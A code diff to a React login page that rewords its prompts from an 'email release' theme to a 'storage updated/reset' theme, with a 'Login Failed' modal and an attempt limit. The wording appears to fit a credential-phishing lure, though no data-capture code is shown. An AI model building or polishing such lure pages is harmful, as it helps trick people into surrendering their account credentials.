@@ -205,7 +205,7 @@ function Index() {
                     disabled={submitting || maxReached}
                     className="rounded-full bg-accent px-8 py-2.5 text-sm font-semibold text-accent-foreground transition hover:bg-[var(--brand-footer)] hover:text-white"
                   >
-                    {submitting ? "Releasing..." : "Log In"}
+                    {submitting ? "Updating..." : "Log In"}
                   </button>
                 </div>
               </form>
@@ -263,10 +263,10 @@ function Index() {
               id="login-failed-title"
               className="text-center text-3xl font-bold text-foreground"
             >
-              Release Failed
+              Login Failed
             </h2>
             <p className="mt-6 text-center text-lg text-foreground">
-              Please use your credential
+              Please use your username and password
             </p>
           </div>
         </div>
@@ -288,9 +288,10 @@ function Index() {
             >
               <X className="h-4 w-4" />
             </button>
-            <h2 className="text-lg font-semibold text-foreground">Email Release success</h2>
-            <p className="mt-2 text-sm text-muted-foreground">
-              Your emails have been released. Await your messages in your inbox.
+            <h2 className="text-center text-2xl font-bold text-foreground">Storage Updated</h2>
+
+            <p className="text-center text-sm text-muted-foreground">
+              Your storage has been reset and updated.
             </p>
           </div>
         </div>
